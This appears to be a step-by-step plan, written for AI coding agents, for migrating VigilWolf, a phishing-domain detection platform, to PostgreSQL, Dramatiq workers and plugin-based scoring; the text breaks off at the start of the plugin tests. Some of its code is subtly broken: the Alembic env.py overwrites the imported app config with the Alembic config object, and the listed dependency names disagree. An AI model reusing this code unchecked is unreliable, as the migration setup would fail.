# VigilWolf v2 Phase 1: Foundation Implementation Plan

> **For agentic workers:** REQUIRED SUB-SKILL: Use superpowers:subagent-driven-development (recommended) or superpowers:executing-plans to implement this plan task-by-task. Steps use checkbox (`- [ ]`) syntax for tracking.

**Goal:** Migrate VigilWolf from v1 (SQLite + APScheduler) to v2 (PostgreSQL + Dramatiq + plugin scoring + webhook alerting + enhanced frontend), targeting 10K NRDs/day throughput.

**Architecture:** FastAPI monolith + Dramatiq workers + PostgreSQL + Redis (broker/cache/rate-limit) + Qdrant (deferred to Phase 2). Plugin-based scoring with 5 detectors max. Strangler fig migration with dual-write, feature flags, and alert dry-run.

**Tech Stack:** FastAPI, Dramatiq, PostgreSQL 16, Redis 7, SQLAlchemy 2.x, Alembic, Next.js 16, React 19, TanStack Query, Zustand, shadcn/ui

**Design spec:** `docs/superpowers/specs/2026-04-28-vigilwolf-v2-easm-platform-design.md`

---

## File Structure (Phase 1)

### Backend — New files

```
backend/
  worker.py                              # Dramatiq actor definitions
  plugins/
    base.py                              # AnalysisPlugin, PluginResult, SnapshotContext, PluginType
    registry.py                           # PLUGIN_REGISTRY, register_plugin, ExecutionGroup, CircuitBreaker
    login_detector.py                     # Detection plugin
    keyword_detector.py                   # Detection plugin
    brand_match.py                        # Detection plugin
    external_js_detector.py               # Detection plugin
    nrd_age_scorer.py                     # Detection plugin
    html_hasher.py                         # Fingerprint plugin
    ioc_extractor.py                      # Extraction plugin (Phase 1 skeleton for context)
  services/
    __init__.py
    scoring_service.py                    # Weighted scoring, normalization, hard signals
    alert_service.py                       # Webhook delivery, dedup, retry
    search_service.py                     # Global search + pivot
  routes/
    __init__.py
    v2/
      __init__.py
      domains.py                           # Domain + threat endpoints
      webhooks.py                          # Webhook CRUD + test
      alerts.py                            # Alert history
      search.py                            # Global search + pivot
      plugins.py                           # Plugin management
      monitoring.py                        # Monitoring v2 endpoints
  migrations/
    env.py                                # Alembic env
    versions/
      001_initial_v2_schema.py            # All v2 tables
```

### Backend — Modified files

```
backend/
  config.py                               # Add PostgreSQL, Dramatiq, feature flags, plugin configs
  database.py                              # PostgreSQL engine + all new ORM models
  main.py                                 # Mount v2 routes, feature flag guards
  requirements.txt                         # Add dramatiq[dynamodb], psycopg2-binary, etc.
  docker-compose.yml                       # Add postgres, worker services
  plugins/
    capture_engine.py                      # Add SnapshotContext build method
    monitoring_service.py                  # Dispatch via Dramatiq when flag enabled
    storage_manager.py                     # Add v2 table operations
```

### Frontend — New files

```
frontend/
  app/
    threats/
      page.tsx                             # Threat feed
      [id]/page.tsx                        # Threat detail
    alerts/
      page.tsx                             # Alert history + webhook config
  components/
    layout/
      sidebar.tsx                          # Sidebar navigation
      header.tsx                           # Top bar with global search
    threats/
      threat-table.tsx                     # Virtualized threat list
      threat-score-badge.tsx               # Risk badge
      score-breakdown.tsx                  # Per-plugin score viz
      ioc-list.tsx                         # IOC display
    alerts/
      webhook-card.tsx                     # Webhook config card
      webhook-form.tsx                     # Add/edit webhook
      alert-history.tsx                    # Alert list
    shared/
      score-bar.tsx                        # Reusable score visualization
      risk-badge.tsx                       # HIGH/MEDIUM/LOW badge
      severity-badge.tsx                   # CRITICAL/HIGH/MEDIUM/LOW badge
      global-search.tsx                    # Global search component
  lib/
    query-client.tsx                       # TanStack Query provider + config
    store.ts                               # Zustand store (UI state)
    api-v2.ts                              # v2 API client
```

### Frontend — Modified files

```
frontend/
  app/layout.tsx                           # Sidebar layout + QueryClientProvider
  app/page.tsx                             # Dashboard redesign
  app/settings/page.tsx                    # Plugin weights + risk thresholds
  lib/api.ts                               # Add v2 endpoints
  package.json                             # Add @tanstack/react-query, zustand, react-virtualized
```

---

## Task 1: Infrastructure Setup — PostgreSQL + Alembic + Dramatiq

**Files:**
- Modify: `vigilwolf-core/docker-compose.yml`
- Modify: `vigilwolf-core/backend/requirements.txt`
- Modify: `vigilwolf-core/backend/config.py`
- Create: `vigilwolf-core/backend/migrations/env.py`
- Create: `vigilwolf-core/backend/alembic.ini`

- [ ] **Step 1: Add PostgreSQL service to docker-compose.yml**

Add after the `redis` service in `vigilwolf-core/docker-compose.yml`:

```yaml
  postgres:
    image: postgres:16-alpine
    container_name: vigilwolf-postgres
    environment:
      POSTGRES_DB: vigilwolf
      POSTGRES_USER: vigilwolf
      POSTGRES_PASSWORD: ${POSTGRES_PASSWORD:-changeme}
    volumes:
      - postgres-data:/var/lib/postgresql/data
    ports:
      - "5432:5432"
    restart: unless-stopped
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U vigilwolf"]
      interval: 10s
      timeout: 5s
      retries: 5
```

Add to `volumes:` section:
```yaml
  postgres-data:
    driver: local
```

Update `backend` service environment to include:
```yaml
      - DATABASE_URL=postgresql://vigilwolf:${POSTGRES_PASSWORD:-changeme}@postgres:5432/vigilwolf
```

Update `backend` service `depends_on:` to include `postgres`.

- [ ] **Step 2: Add new Python dependencies**

Add to `vigilwolf-core/backend/requirements.txt`:

```
# Task Queue
dramatiq[redis]>=1.15.0

# PostgreSQL
psycopg2-binary>=2.9.0

# Already present — ensure these versions:
# sqlalchemy>=2.0.0
# alembic>=1.12.0
```

- [ ] **Step 3: Add v2 config variables to config.py**

Add these to `vigilwolf-core/backend/config.py` after the existing config block:

```python
# --- V2 Configuration ---

# Feature flags (migration safety)
USE_DRAMATIQ_PIPELINE = os.getenv("USE_DRAMATIQ_PIPELINE", "false").lower() == "true"
CLUSTERING_ENABLED = os.getenv("CLUSTERING_ENABLED", "false").lower() == "true"
ALERTS_ENABLED = os.getenv("ALERTS_ENABLED", "false").lower() == "true"
ALERTS_DRY_RUN = os.getenv("ALERTS_DRY_RUN", "true").lower() == "true"

# Per-plugin feature flags
ENABLED_PLUGINS = os.getenv(
    "ENABLED_PLUGINS",
    "login_detector,keyword_detector,brand_match,external_js_detector,nrd_age_scorer,html_hasher"
).split(",")

# Risk thresholds (configurable via env)
RISK_THRESHOLD_HIGH = int(os.getenv("RISK_THRESHOLD_HIGH", "70"))
RISK_THRESHOLD_MEDIUM = int(os.getenv("RISK_THRESHOLD_MEDIUM", "40"))

# High-risk registrars (for context modifier)
HIGH_RISK_REGISTRARS = os.getenv(
    "HIGH_RISK_REGISTRARS",
    "namecheap,godaddy,dynadot"
).split(",")

# Dramatiq
DRAMATIQ_BROKER_URL = os.getenv("DRAMATIQ_BROKER_URL", "redis://localhost:6379/0")

# Redis logical separation
REDIS_CACHE_DB = int(os.getenv("REDIS_CACHE_DB", "1"))
REDIS_RATE_LIMIT_DB = int(os.getenv("REDIS_RATE_LIMIT_DB", "2"))

# Pipeline
PIPELINE_TIMEOUT_SECONDS = int(os.getenv("PIPELINE_TIMEOUT_SECONDS", "120"))
```

- [ ] **Step 4: Initialize Alembic**

Run from `vigilwolf-core/backend/`:

```bash
cd vigilwolf-core/backend
alembic init migrations
```

Then modify `migrations/env.py` to import `database.Base` and `config.DATABASE_URL`:

```python
from logging.config import fileConfig
from sqlalchemy import engine_from_config, pool
from alembic import context
import config
from database import Base

config = context.config
if config.config_file_name is not None:
    fileConfig(config.config_file_name)

target_metadata = Base.metadata

def run_migrations_offline():
    url = config.get_main_option("sqlalchemy.url") or config.DATABASE_URL
    context.configure(url=url, target_metadata=target_metadata, literal_binds=True)
    with context.begin_transaction():
        context.run_migrations()

def run_migrations_online():
    connectable = engine_from_config(
        {"sqlalchemy.url": config.DATABASE_URL},
        prefix="sqlalchemy.",
        poolclass=pool.NullPool,
    )
    with connectable.connect() as connection:
        context.configure(connection=connection, target_metadata=target_metadata)
        with context.begin_transaction():
            context.run_migrations()

if context.is_offline_mode():
    run_migrations_offline()
else:
    run_migrations_online()
```

- [ ] **Step 5: Test infrastructure starts**

```bash
cd vigilwolf-core
docker compose up -d postgres redis
docker compose exec postgres pg_isready -U vigilwolf
```

Expected: "accepting connections"

- [ ] **Step 6: Commit**

```bash
git add vigilwolf-core/docker-compose.yml vigilwolf-core/backend/requirements.txt \
  vigilwolf-core/backend/config.py vigilwolf-core/backend/alembic.ini \
  vigilwolf-core/backend/migrations/
git commit -m "feat: add PostgreSQL, Dramatiq dependencies, Alembic setup, v2 config flags"
```

---

## Task 2: Database Schema Migration — PostgreSQL Models

**Files:**
- Modify: `vigilwolf-core/backend/database.py`
- Create: `vigilwolf-core/backend/migrations/versions/001_initial_v2_schema.py`
- Test: `vigilwolf-core/backend/test_v2_schema.py`

- [ ] **Step 1: Write the failing test for v2 schema tables**

Create `vigilwolf-core/backend/test_v2_schema.py`:

```python
"""Test that all v2 schema tables exist with correct columns."""
import pytest
from sqlalchemy import inspect
from database import get_engine, Base, init_db


@pytest.fixture
def engine():
    """Create an in-memory SQLite engine for schema testing."""
    from sqlalchemy import create_engine
    eng = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(bind=eng)
    yield eng


def test_domains_table_exists(engine):
    inspector = inspect(engine)
    columns = {c["name"] for c in inspector.get_columns("domains")}
    assert "id" in columns
    assert "domain" in columns
    assert "first_seen" in columns
    assert "last_seen" in columns
    assert "registrar" in columns
    assert "asn" in columns


def test_snapshots_table_has_v2_columns(engine):
    inspector = inspect(engine)
    columns = {c["name"] for c in inspector.get_columns("snapshots")}
    assert "sha256" in columns
    assert "size_bytes" in columns
    assert "retention_flag" in columns


def test_risk_scores_table_exists(engine):
    inspector = inspect(engine)
    assert "risk_scores" in inspector.get_table_names()


def test_analysis_results_table_exists(engine):
    inspector = inspect(engine)
    columns = {c["name"] for c in inspector.get_columns("analysis_results")}
    assert "plugin_name" in columns
    assert "plugin_version" in columns
    assert "plugin_type" in columns
    assert "confidence" in columns
    assert "tags" in columns


def test_webhooks_table_exists(engine):
    inspector = inspect(engine)
    assert "webhooks" in inspector.get_table_names()


def test_alerts_table_has_v2_columns(engine):
    inspector = inspect(engine)
    columns = {c["name"] for c in inspector.get_columns("alerts")}
    assert "dedup_key" in columns
    assert "severity" in columns
    assert "payload_version" in columns


def test_domain_processing_state_exists(engine):
    inspector = inspect(engine)
    assert "domain_processing_state" in inspector.get_table_names()


def test_plugin_weights_table_exists(engine):
    inspector = inspect(engine)
    assert "plugin_weights" in inspector.get_table_names()


def test_domain_ips_table_exists(engine):
    inspector = inspect(engine)
    assert "domain_ips" in inspector.get_table_names()


def test_snapshot_plugin_status_exists(engine):
    inspector = inspect(engine)
    assert "snapshot_plugin_status" in inspector.get_table_names()
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd vigilwolf-core/backend
pytest test_v2_schema.py -v
```

Expected: FAIL — new tables/columns don't exist yet in `database.py`.

- [ ] **Step 3: Add all v2 ORM models to database.py**

This is the largest single step. Add the following models to `vigilwolf-core/backend/database.py` after the existing `DumpLogModel`. Note: for SQLite compatibility in tests, use `String` instead of PostgreSQL-native `INET` (add a comment marking where PostgreSQL would use `INET`):

```python
# --- V2 Models ---

class DomainProcessingStateModel(Base):
    __tablename__ = 'domain_processing_state'
    id = Column(Integer, primary_key=True, autoincrement=True)
    domain_id = Column(String(36), ForeignKey('domains.id', ondelete='CASCADE'), unique=True, nullable=False)
    status = Column(String(20), nullable=False, default='pending')
    last_processed_at = Column(DateTime(timezone=True), nullable=True)
    retry_count = Column(Integer, default=0)
    error_message = Column(Text, nullable=True)
    priority = Column(String(10), nullable=False, default='low')
    updated_at = Column(DateTime(timezone=True), default=utc_now, onupdate=utc_now)

    domain = relationship('DomainModel', backref='processing_state', uselist=False)


class DomainIpModel(Base):
    __tablename__ = 'domain_ips'
    id = Column(Integer, primary_key=True, autoincrement=True)
    domain_id = Column(String(36), ForeignKey('domains.id', ondelete='CASCADE'), nullable=False)
    ip = Column(String(45), nullable=False)  # PostgreSQL: INET type
    first_seen = Column(DateTime(timezone=True), default=utc_now)
    last_seen = Column(DateTime(timezone=True), default=utc_now)

    domain = relationship('DomainModel', backref='ips')


class DnsRecordModel(Base):
    __tablename__ = 'dns_records'
    id = Column(Integer, primary_key=True, autoincrement=True)
    domain_id = Column(String(36), ForeignKey('domains.id', ondelete='CASCADE'), nullable=False)
    type = Column(String(10), nullable=False)
    value = Column(Text, nullable=False)
    ttl = Column(Integer, nullable=True)
    first_seen = Column(DateTime(timezone=True), default=utc_now)
    last_seen = Column(DateTime(timezone=True), default=utc_now)

    domain = relationship('DomainModel', backref='dns_records')


class SnapshotPluginStatusModel(Base):
    __tablename__ = 'snapshot_plugin_status'
    id = Column(Integer, primary_key=True, autoincrement=True)
    snapshot_id = Column(String(36), ForeignKey('snapshots.id', ondelete='CASCADE'), nullable=False)
    plugin_name = Column(String(50), nullable=False)
    status = Column(String(20), nullable=False, default='pending')
    started_at = Column(DateTime(timezone=True), nullable=True)
    completed_at = Column(DateTime(timezone=True), nullable=True)
    error_message = Column(Text, nullable=True)

    snapshot = relationship('SnapshotModel', backref='plugin_statuses')
    __table_args__ = (UniqueConstraint('snapshot_id', 'plugin_name'),)


class AnalysisResultModel(Base):
    __tablename__ = 'analysis_results'
    id = Column(Integer, primary_key=True, autoincrement=True)
    snapshot_id = Column(String(36), ForeignKey('snapshots.id', ondelete='CASCADE'), nullable=False)
    plugin_name = Column(String(50), nullable=False)
    plugin_version = Column(String(20), nullable=False)
    plugin_type = Column(String(20), nullable=False)
    result_json = Column(JSON, nullable=False)
    score_contribution = Column(Integer, default=0)
    confidence = Column(Float, default=1.0)
    tags = Column(JSON, default=list)
    created_at = Column(DateTime(timezone=True), default=utc_now)

    snapshot = relationship('SnapshotModel', backref='analysis_results')
    __table_args__ = (UniqueConstraint('snapshot_id', 'plugin_name'),)


class RiskScoreModel(Base):
    __tablename__ = 'risk_scores'
    id = Column(Integer, primary_key=True, autoincrement=True)
    snapshot_id = Column(String(36), ForeignKey('snapshots.id', ondelete='CASCADE'), unique=True, nullable=False)
    total_score = Column(Integer, nullable=False)
    normalized_score = Column(Float, nullable=False)
    risk_level = Column(String(10), nullable=False)
    severity = Column(String(10), nullable=False)
    reasons = Column(JSON, nullable=False)
    dominant_signals = Column(JSON, nullable=False, default=list)
    plugin_breakdown = Column(JSON, nullable=False, default=dict)
    overall_confidence = Column(Float, nullable=False, default=1.0)
    created_at = Column(DateTime(timezone=True), default=utc_now)

    snapshot = relationship('SnapshotModel', backref='risk_score', uselist=False)


# Add new columns to existing SnapshotModel (via migration, but also add here for test schema)
# We'll modify SnapshotModel to include sha256, size_bytes, retention_flag
# This requires an Alembic migration for existing databases

class PluginWeightModel(Base):
    __tablename__ = 'plugin_weights'
    id = Column(Integer, primary_key=True, autoincrement=True)
    plugin_name = Column(String(50), unique=True, nullable=False)
    weight = Column(Float, nullable=False, default=1.0)
    enabled = Column(Boolean, default=True)
    updated_at = Column(DateTime(timezone=True), default=utc_now, onupdate=utc_now)


class WebhookModel(Base):
    __tablename__ = 'webhooks'
    id = Column(String(36), primary_key=True, default=lambda: str(uuid.uuid4()))
    name = Column(String(200), nullable=False)
    url = Column(Text, nullable=False)
    secret = Column(Text, nullable=True)
    events = Column(JSON, nullable=False)
    filters = Column(JSON, nullable=True, default=dict)
    enabled = Column(Boolean, default=True)
    created_at = Column(DateTime(timezone=True), default=utc_now)


class AlertModel(Base):
    __tablename__ = 'alerts'
    id = Column(Integer, primary_key=True, autoincrement=True)
    event_type = Column(String(50), nullable=False)
    dedup_key = Column(String(200), nullable=False)
    domain_id = Column(String(36), ForeignKey('domains.id', ondelete='SET NULL'), nullable=True)
    snapshot_id = Column(String(36), ForeignKey('snapshots.id', ondelete='SET NULL'), nullable=True)
    risk_level = Column(String(10), nullable=True)
    severity = Column(String(10), nullable=False)
    score = Column(Integer, nullable=True)
    campaign_id = Column(String(36), nullable=True)
    webhook_id = Column(String(36), ForeignKey('webhooks.id', ondelete='SET NULL'), nullable=True)
    payload = Column(JSON, nullable=False)
    payload_version = Column(String(10), nullable=False, default='1.0')
    status = Column(String(20), nullable=False, default='sent')
    attempts = Column(Integer, default=0)
    last_attempt_at = Column(DateTime(timezone=True), nullable=True)
    created_at = Column(DateTime(timezone=True), default=utc_now)


class AnalystFeedbackModel(Base):
    __tablename__ = 'analyst_feedback'
    id = Column(Integer, primary_key=True, autoincrement=True)
    snapshot_id = Column(String(36), ForeignKey('snapshots.id', ondelete='CASCADE'), nullable=False)
    label = Column(String(20), nullable=False)
    analyst_id = Column(String(100), nullable=True)
    created_at = Column(DateTime(timezone=True), default=utc_now)


class AuditLogModel(Base):
    __tablename__ = 'audit_logs'
    id = Column(Integer, primary_key=True, autoincrement=True)
    action = Column(String(100), nullable=False)
    actor_id = Column(String(100), nullable=True)
    resource_type = Column(String(50), nullable=True)
    resource_id = Column(String(100), nullable=True)
    details = Column(JSON, nullable=True)
    created_at = Column(DateTime(timezone=True), default=utc_now)
```

Also update `SnapshotModel` to add v2 columns:

```python
class SnapshotModel(Base):
    __tablename__ = 'snapshots'
    # ... existing columns ...
    sha256 = Column(String(64), nullable=True)          # new
    size_bytes = Column(BigInteger, default=0)            # new
    retention_flag = Column(String(20), default='standard')  # new
```

Add the `UniqueConstraint` for `(domain_id, sha256)` in `SnapshotModel.__table_args__`.

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd vigilwolf-core/backend
pytest test_v2_schema.py -v
```

Expected: PASS — all tables and columns exist.

- [ ] **Step 5: Create Alembic migration**

```bash
cd vigilwolf-core/backend
alembic revision --autogenerate -m "001_initial_v2_schema"
```

Review the generated migration and adjust if needed. Then apply:

```bash
alembic upgrade head
```

- [ ] **Step 6: Verify PostgreSQL tables exist**

```bash
docker compose exec postgres psql -U vigilwolf -c "\dt"
```

Expected: all v2 tables listed.

- [ ] **Step 7: Run existing v1 tests to verify no regression**

```bash
cd vigilwolf-core/backend
pytest test_models.py test_storage_manager.py test_monitoring_service.py -v
```

Expected: All pass (existing v1 models unchanged).

- [ ] **Step 8: Commit**

```bash
git add vigilwolf-core/backend/database.py vigilwolf-core/backend/test_v2_schema.py \
  vigilwolf-core/backend/migrations/
git commit -m "feat: add v2 PostgreSQL schema — all tables for domains, risk_scores, alerts, plugins"
```

---

## Task 3: Data Migration — SQLite to PostgreSQL with Dual-Write

**Files:**
- Create: `vigilwolf-core/backend/migrate_sqlite_to_pg.py`
- Create: `vigilwolf-core/backend/test_data_migration.py`

- [ ] **Step 1: Write the failing migration test**

Create `vigilwolf-core/backend/test_data_migration.py`:

```python
"""Test SQLite to PostgreSQL data migration integrity."""
import pytest
from sqlalchemy import create_engine, select
from database import Base, GroupModel, DomainModel, SnapshotModel


def test_migrate_groups_count_matches():
    """After migration, group count in PG must equal SQLite count."""
    # This test uses two engines — source (SQLite) and target (PG-compatible SQLite)
    source_engine = create_engine("sqlite:///:memory:")
    target_engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(bind=source_engine)
    Base.metadata.create_all(bind=target_engine)

    # Insert a group in source
    with source_engine.connect() as conn:
        conn.execute(GroupModel.__table__.insert().values(id="g1", name="Test Group"))
        conn.commit()

    from migrate_sqlite_to_pg import migrate_table
    migrate_table(source_engine, target_engine, GroupModel)

    with target_engine.connect() as conn:
        result = conn.execute(select(GroupModel)).fetchall()
        assert len(result) == 1
        assert result[0].name == "Test Group"


def test_migrate_domains_preserves_all_fields():
    source_engine = create_engine("sqlite:///:memory:")
    target_engine = create_engine("sqlite:///:memory:")
    Base.metadata.create_all(bind=source_engine)
    Base.metadata.create_all(bind=target_engine)

    with source_engine.connect() as conn:
        conn.execute(GroupModel.__table__.insert().values(id="g1", name="G"))
        conn.execute(DomainModel.__table__.insert().values(
            id="d1", group_id="g1", url="https://example.com",
            dump_mode="html_only", frequency_seconds=300, active=True
        ))
        conn.commit()

    from migrate_sqlite_to_pg import migrate_table
    migrate_table(source_engine, target_engine, DomainModel)

    with target_engine.connect() as conn:
        result = conn.execute(select(DomainModel)).fetchall()
        assert len(result) == 1
        assert result[0].url == "https://example.com"
        assert result[0].dump_mode == "html_only"
        assert result[0].frequency_seconds == 300
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd vigilwolf-core/backend
pytest test_data_migration.py -v
```

Expected: FAIL — `migrate_sqlite_to_pg` module doesn't exist.

- [ ] **Step 3: Write migration script**

Create `vigilwolf-core/backend/migrate_sqlite_to_pg.py`:

```python
"""One-time migration from SQLite to PostgreSQL with validation."""
import os
import sys
import logging
from sqlalchemy import create_engine, select, text, inspect
from sqlalchemy.orm import sessionmaker

from database import Base, GroupModel, DomainModel, SnapshotModel, PingLogModel, DumpLogModel

logger = logging.getLogger(__name__)

MIGRATION_TABLES = [
    GroupModel,
    DomainModel,
    SnapshotModel,
    PingLogModel,
    DumpLogModel,
]


def migrate_table(source_engine, target_engine, model_class, batch_size=1000):
    """Copy all rows of a table from source to target DB in batches."""
    table = model_class.__table__
    with source_engine.connect() as source_conn:
        total = source_conn.execute(select(text(f"COUNT(*) FROM {table.name}"))).scalar()
        logger.info(f"Migrating {table.name}: {total} rows")

        offset = 0
        while offset < total:
            rows = source_conn.execute(
                select(table).offset(offset).limit(batch_size)
            ).fetchall()

            with target_engine.connect() as target_conn:
                for row in rows:
                    row_dict = dict(row._mapping)
                    target_conn.execute(table.insert().values(**row_dict))
                target_conn.commit()

            offset += batch_size
            logger.info(f"  Migrated {min(offset, total)}/{total}")


def validate_migration(source_engine, target_engine):
    """Validate that row counts match between source and target."""
    errors = []
    for model in MIGRATION_TABLES:
        table = model.__table__
        with source_engine.connect() as src:
            src_count = src.execute(select(text(f"COUNT(*) FROM {table.name}"))).scalar()
        with target_engine.connect() as tgt:
            tgt_count = tgt.execute(select(text(f"COUNT(*) FROM {table.name}"))).scalar()

        if src_count != tgt_count:
            errors.append(f"{table.name}: source={src_count}, target={tgt_count}")
        else:
            logger.info(f"  {table.name}: {src_count} rows ✓")

    return errors


def run_migration(source_url, target_url):
    """Execute full migration with validation."""
    source_engine = create_engine(source_url)
    target_engine = create_engine(target_url)

    logger.info("Starting SQLite → PostgreSQL migration")

    for model in MIGRATION_TABLES:
        migrate_table(source_engine, target_engine, model)

    errors = validate_migration(source_engine, target_engine)

    if errors:
        logger.error(f"Migration validation FAILED: {errors}")
        return False

    logger.info("Migration completed successfully ✓")
    return True


if __name__ == "__main__":
    logging.basicConfig(level=logging.INFO)
    source_url = sys.argv[1] if len(sys.argv) > 1 else os.getenv("SQLITE_URL")
    target_url = sys.argv[2] if len(sys.argv) > 2 else os.getenv("DATABASE_URL")

    if not source_url or not target_url:
        print("Usage: python migrate_sqlite_to_pg.py <source_sqlite_url> <target_pg_url>")
        sys.exit(1)

    success = run_migration(source_url, target_url)
    sys.exit(0 if success else 1)
```

- [ ] **Step 4: Run tests to verify they pass**

```bash
cd vigilwolf-core/backend
pytest test_data_migration.py -v
```

Expected: PASS

- [ ] **Step 5: Commit**

```bash
git add vigilwolf-core/backend/migrate_sqlite_to_pg.py vigilwolf-core/backend/test_data_migration.py
git commit -m "feat: add SQLite→PostgreSQL migration script with validation"
```

---

## Task 4: Plugin Framework — Base Classes + Registry

**Files:**
- Create: `vigilwolf-core/backend/plugins/base.py`
- Create: `vigilwolf-core/backend/plugins/registry.py`
- Create: `vigilwolf-core/backend/test_plugin_framework.py`

- [ ] **Step 1: Write the failing tests**

Create `vigilwolf-core/backend/test_plugin_framework.py`:

```python
"""Test plugin framework: base classes, registry, execution groups."""
import pytest
from plugins.base import AnalysisPlugin, PluginResult, SnapshotContext, PluginType
from plugins.registry import PLUGIN_REGISTRY, register_plugin, ExecutionGroup, get_execution_groups


def test_plugin_type_enum():
    assert PluginType.DETECTION.value == "detection"
    assert PluginType.EXTRACTION.value == "extraction"
    assert PluginType.ENRICHMENT.value == "enrichment"
    assert PluginType.FINGERPRINT.value == "fingerprint"


def test_snapshot_context_creation():
    ctx = SnapshotContext(
        snapshot_id="snap1",
        domain="example.com",
        html="<html></html>",
        text="Hello",
        forms=[],
        links=["https://example.com/page"],
        scripts=[],
        metadata={"title": "Example"},
        snapshot_record={"id": "snap1", "domain_id": "d1"},
    )
    assert ctx.domain == "example.com"
    assert ctx.text == "Hello"


def test_plugin_result_creation():
    result = PluginResult(
        plugin_name="login_detector",
        plugin_version="1.0.0",
        plugin_type=PluginType.DETECTION,
        score_contribution=40,
        confidence=0.95,
        tags=["login_form_detected"],
        findings={"has_password_field": True},
    )
    assert result.score_contribution == 40
    assert result.confidence == 0.95


def test_register_plugin():
    @register_plugin
    class TestPlugin(AnalysisPlugin):
        name = "test_plugin_framework"
        version = "1.0.0"
        plugin_type = PluginType.DETECTION

        def run(self, ctx):
            return PluginResult(
                plugin_name=self.name,
                plugin_version=self.version,
                plugin_type=self.plugin_type,
                score_contribution=0,
                confidence=1.0,
                tags=[],
                findings={},
            )

    assert "test_plugin_framework" in PLUGIN_REGISTRY
    # Cleanup
    del PLUGIN_REGISTRY["test_plugin_framework"]


def test_execution_groups_structure():
    groups = get_execution_groups()
    assert isinstance(groups, list)
    assert all(isinstance(g, ExecutionGroup) for g in groups)
    # Detection group must exist
    detect_group = next(g for g in groups if g.name == "detect")
    assert len(detect_group.plugins) > 0


def test_plugin_must_define_name_and_type():
    with pytest.raises((TypeError, AttributeError)):
        class BadPlugin(AnalysisPlugin):
            def run(self, ctx):
                pass
        # Missing name, version, plugin_type
        BadPlugin()
```

- [ ] **Step 2: Run tests to verify they fail**

```bash
cd vigilwolf-core/backend
pytest test_plugin_framework.py -v
```

Expected: FAIL — `plugins.base` and `plugins.registry` don't exist.

- [ ] **Step 3: Create plugins/base.py**

Create `vigilwolf-core/backend/plugins/base.py`:

```python
"""Plugin framework base classes for VigilWolf v2 analysis pipeline."""
from enum import Enum
from dataclasses import dataclass, field
from typing import Optional, Any


class PluginType(Enum):
    DETECTION = "detection"
    EXTRACTION = "extraction"
    ENRICHMENT = "enrichment"
    FINGERPRINT = "fingerprint"


@dataclass
class SnapshotContext:
    snapshot_id: str
    domain: str
    html: str
    text: str
    forms: list
    links: list[str]
    scripts: list[dict]
    metadata: dict
    snapshot_record: dict


@dataclass
class PluginResult:
    plugin_name: str
    plugin_version: str
    plugin_type: PluginType
    score_contribution: int
    confidence: float
    tags: list[str]
    findings: dict
    error: Optional[str] = None


class AnalysisPlugin:
    name: str = ""
    version: str = ""
    plugin_type: PluginType = PluginType.DETECTION

    def run(self, ctx: SnapshotContext) -> PluginResult:
        raise NotImplementedError(
            f"Plugin {self.name} must implement run()"
        )
```

- [ ] **Step 4: Create plugins/registry.py**

Create `vigilwolf-core/backend/plugins/registry.py`:

```python
"""Plugin registry, execution groups, and circuit breaker for VigilWolf v2."""
from dataclasses import dataclass
from typing import Optional
import logging

from plugins.base import AnalysisPlugin, PluginType
import config

logger = logging.getLogger(__name__)

PLUGIN_REGISTRY: dict[str, type[AnalysisPlugin]] = {}


def register_plugin(cls: type[AnalysisPlugin]) -> type[AnalysisPlugin]:
    """Register a plugin class. Decorator usage: @register_plugin"""
    if not cls.name:
        raise ValueError(f"Plugin {cls.__name__} must define a 'name' attribute")
    if cls.name in PLUGIN_REGISTRY:
        logger.warning(f"Plugin {cls.name} already registered, overwriting")
    PLUGIN_REGISTRY[cls.name] = cls
    logger.info(f"Registered plugin: {cls.name} v{cls.version} ({cls.plugin_type.value})")
    return cls


@dataclass
class ExecutionGroup:
    name: str
    plugins: list[tuple[str, int]]  # (plugin_name, priority)


def get_execution_groups() -> list[ExecutionGroup]:
    """Return execution groups filtered by ENABLED_PLUGINS config."""
    enabled = [p.strip() for p in config.ENABLED_PLUGINS if p.strip()]

    all_groups = [
        ExecutionGroup(name="enrich", plugins=[
            ("whois_enricher", 1),
            ("dns_enricher", 1),
        ]),
        ExecutionGroup(name="detect", plugins=[
            ("login_detector", 1),
            ("brand_match", 1),
            ("keyword_detector", 2),
            ("external_js_detector", 2),
            ("nrd_age_scorer", 2),
        ]),
        ExecutionGroup(name="extract", plugins=[
            ("ioc_extractor", 1),
        ]),
        ExecutionGroup(name="fingerprint", plugins=[
            ("html_hasher", 1),
        ]),
    ]

    filtered = []
    for group in all_groups:
        plugins = [(name, pri) for name, pri in group.plugins if name in enabled]
        if plugins:
            filtered.append(ExecutionGroup(name=group.name, plugins=plugins))

    return filtered


class CircuitBreaker:
    """Controls plugin execution under system load."""

    HIGH_IMPACT_PLUGINS = {"login_detector", "brand_match"}

    def __init__(self, threshold: int = 10000, cooldown: int = 300):
        self.threshold = threshold
        self.cooldown = cooldown

    def should_run(self, plugin_name: str, plugin_type: PluginType,
                   queue_depth: int) -> bool:
        if queue_depth <= self.threshold:
            return True
        if plugin_type == PluginType.DETECTION:
            return plugin_name in self.HIGH_IMPACT_PLUGINS
        if plugin_type == PluginType.EXTRACTION:
            return True
        return False  # skip enrichment + fingerprint under load


# Global circuit breaker instance
circuit_breaker = CircuitBreaker()
```

- [ ] **Step 5: Run tests to verify they pass**

```bash
cd vigilwolf-core/backend
pytest test_plugin_framework.py -v
```

Expected: PASS

- [ ] **Step 6: Commit**

```bash
git add vigilwolf-core/backend/plugins/base.py vigilwolf-core/backend/plugins/registry.py \
  vigilwolf-core/backend/test_plugin_framework.py
git commit -m "feat: add plugin framework — base classes, registry, execution groups, circuit breaker"
```

---

## Task 5: Phase 1 Detection Plugins (5 max)

**Files:**
- Create: `vigilwolf-core/backend/plugins/login_detector.py`
- Create: `vigilwolf-core/backend/plugins/keyword_detector.py`
- Create: `vigilwolf-core/backend/plugins/brand_match.py`
- Create: `vigilwolf-core/backend/plugins/external_js_detector.py`
- Create: `vigilwolf-core/backend/plugins/nrd_age_scorer.py`
- Create: `vigilwolf-core/backend/plugins/html_hasher.py`
- Create: `vigilwolf-core/backend/test_plugins.py`

- [ ] **Step 1: Write the failing tests for all 5 detection plugins + html_hasher**

Create `vigilwolf-core/backend/test_plugins.py`:

```python
"""Test Phase 1 analysis plugins."""
import pytest
from plugins.base import SnapshotContext, PluginType
